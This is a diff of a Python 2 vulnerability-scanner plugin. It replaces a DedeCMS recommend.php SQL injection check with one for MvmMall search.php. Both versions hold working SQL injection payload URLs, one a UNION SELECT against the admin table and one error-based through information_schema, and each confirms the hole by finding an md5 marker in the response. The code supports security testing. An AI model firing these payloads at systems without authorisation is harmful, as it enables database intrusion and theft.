@@ -3,13 +3,14 @@
 
 import urllib2
 from dummy import *
+import re
 
 info = {
-	'NAME':'DeDecms5.7 plus recommend php injection',
-	'AUTHOR':'seay,wjk',
-	'TIME':'20150323',
+	'NAME':'MvmMall search.php sql injection',
+	'AUTHOR':'wjk',
+	'TIME':'20150325',
 	'WEB':'',
-	'DESCRIPTION':'DedeCMS recommend.php文件通杀SQL注入漏洞，详见http://www.cnseay.com/3714/'
+	'DESCRIPTION':'MvmMall SQL INJECTION,http://www.wooyun.org/bugs/wooyun-2011-01732'
 }
 opts = [
 	['url','http://testasp.vulnweb.com','target url'],
@@ -17,16 +18,16 @@ opts = [
 
 def Assign(services):
 	if services.has_key('url') and services.has_key('cms'):
-		if services['cms'] == 'DedeCms':
+		if services['cms'] == 'mvmmall':
 			return True
 	return False
 
 def Audit(services):
-	url = services['url'] +'/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27and+char(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(0x40776562736166657363616E40),5,6,7,8,9%20from%20`%23@__admin`%23'
+	url = services['url'] +"/search.php?tag_ids[goods_id]=uid))%20and(select%201%20from(select%20count(*),concat((select%20(select%20md5(12345))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1%23"
 	try:
 		ul = urllib2.urlopen(url)
 		content = ul.read()
-		if content.find('2e0e20673083dea5cc87a85d54022049') != -1:
+		if content.find('827ccb0eea8a706c4c34a16891f84e7b') != -1:
 			security_hole(url)
 	except:
 		pass
